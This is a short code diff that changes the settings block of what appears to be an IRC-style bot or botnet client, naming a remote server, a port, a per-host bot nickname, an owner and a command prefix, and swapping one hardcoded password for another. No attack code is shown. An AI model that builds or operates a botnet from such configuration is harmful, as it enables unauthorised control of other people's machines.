@@ -7,7 +7,7 @@ import router
 settings_server = "jpdias.noip.me"
 settings_port = 1723
 settings_botnick = "bot-" + socket.gethostname()
-settings_botpass = "password"
+settings_botpass = "botnetpassword"
 settings_owner = "root"
 settings_commandprefix = "!"
 
